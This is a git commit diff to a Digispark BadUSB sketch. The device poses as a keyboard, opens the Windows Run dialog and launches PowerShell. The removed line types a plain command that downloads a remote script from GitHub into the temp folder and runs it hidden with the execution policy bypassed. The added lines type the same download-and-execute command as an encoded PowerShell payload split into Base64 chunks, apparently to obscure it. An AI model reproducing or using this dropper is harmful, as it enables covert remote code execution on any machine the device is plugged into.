8d292b08189d0eb1ba70ea4ef74ec14c91773057
Nicola Lepore <n.lepore@studenti.unipi.it>
2025-04-25 12:39:00 +0200

    Update digi-code.cpp

--- digi-code.cpp
+++ digi-code.cpp
@@ -2,11 +2,53 @@
 
 void setup() {
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000);
+
+  // Apri Esegui (Win+R)
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell -Command \"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/NicolaLepore4/Digi-sounds/main/script.sh', \"$env:TEMP\\script.ps1\"); Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File', \"$env:TEMP\\script.ps1\" -WindowStyle Hidden\"");
+  DigiKeyboard.print(F("powershell"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("powershell.exe "));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.sendKeyStroke(KEY_SLASH);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("encodedCommand "));
+  DigiKeyboard.delay(100);
+
+  // Spezziamo il Base64 in pezzi < 64 byte ciascuno
+  DigiKeyboard.print(F("KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBl"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("AG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAA"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("cwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABl"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("AG4AdAAuAGMAbwBtAC8ATgBpAGMAbwBsAGEATABlAHAAbwByAGUANAAvAEQA"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("aQBnAGkALQBzAG8AdQBuAGQAcwAvAG0AYQBpAG4ALwBzAGMAcgBpAHAAdAAu"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("AHMAaAAnACwAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwBjAHIAaQBwAHQA"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("LgBwAHMAMQAiACkAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABw"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("AG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMA"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("dAAgACcALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBw"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("AGEAcwBzACAALQBGAGkAbABlACcALAAgACIAJABlAG4AdgA6AFQARQBNAFAA"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("XABzAGMAcgBpAHAAdAAuAHAAcwAxACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print(F("AGwAZQAgAEgAaQBkAGQAZQBuAA"));
+  DigiKeyboard.delay(50);
+  DigiKeyboard.sendKeyStroke(KEY_0, MOD_SHIFT_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_0, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
-void loop() {}
+void loop() {
+  // non serve
+}
